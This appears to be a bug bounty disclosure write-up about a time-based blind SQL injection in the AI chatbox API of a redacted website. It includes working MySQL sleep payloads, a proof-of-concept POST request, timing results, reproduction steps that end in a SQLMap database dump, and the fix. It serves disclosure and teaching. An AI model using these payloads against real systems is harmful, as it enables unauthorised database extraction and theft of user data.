# Title: Time-Based Blind SQL Injection in AI Chatbox Integration

- **Platform**: HackerOne
- **Program**: Old Public Bug Bounty Program (Redacted)
- **Severity**: High
- **Date**: 2024-08-20
- **Researcher**: Vishal Barot
- **Bounty**: Undisclosed

## Summary
A time-based blind SQL injection vulnerability was discovered in the AI chatbox integration of a public bug bounty program. The `userId` and `accountId` POST parameters were vulnerable, allowing the researcher to perform time-based extraction of database contents.

## Technical Details
The target application added a new "Connect with AI Assistant" feature that launched an AI chatbox. The researcher intercepted the API requests and found that the POST body contained multiple parameters. The application used MySQL, based on Wappalyzer fingerprinting of the main domain.

The researcher tested each parameter with time-based MySQL payloads. The payload `(select*(from(select(sleep(5)))a)` in the `userId` parameter caused a 15-second delay instead of 5 seconds, indicating the `userId` was used in three places within the SQL query. The `accountId` parameter was also vulnerable with the payload appended as `12345'+(select*(from(select(sleep(5)))a)+'`.

## Steps to Reproduce
1. Navigate to the application and launch the AI chatbox
2. Intercept the API POST request to the chat-agent endpoint
3. Identify the `userId` parameter in the POST body
4. Inject time-based MySQL payload: `(select*(from(select(sleep(5)))a)`
5. Observe ~15-second delay (parameter used 3x in query)
6. Confirm with `accountId` parameter: `12345'+(select*(from(select(sleep(5)))a)+'`
7. Use SQLMap to dump database contents

## Proof of Concept
```
POST /chat-agent/api HTTP/1.1
Host: site.redacted.com
Content-Type: application/json

{
  "userId": "(select*(from(select(sleep(5)))a)",
  "accountId": "12345'+(select*(from(select(sleep(5)))a)+'",
  "message": "test"
}
```

Timing analysis:
- sleep(1) → 3.9 seconds response
- sleep(3) → 9.9 seconds response
- sleep(5) → 15.9 seconds response

## Impact
- Full database extraction via time-based SQL injection
- Access to user data, sessions, and credentials
- XSS payloads could potentially be stored through the chat function
- The attacker could dump the entire application database

## Remediation
The program fixed the issue by implementing parameterized queries for the chat-agent API endpoint. Input validation and prepared statements were added to prevent SQL injection in all user-controlled parameters.

## References
- https://medium.com/@kshunya/how-i-got-time-based-sql-injection-in-an-old-public-bug-bounty-program-f6260cd4e75e
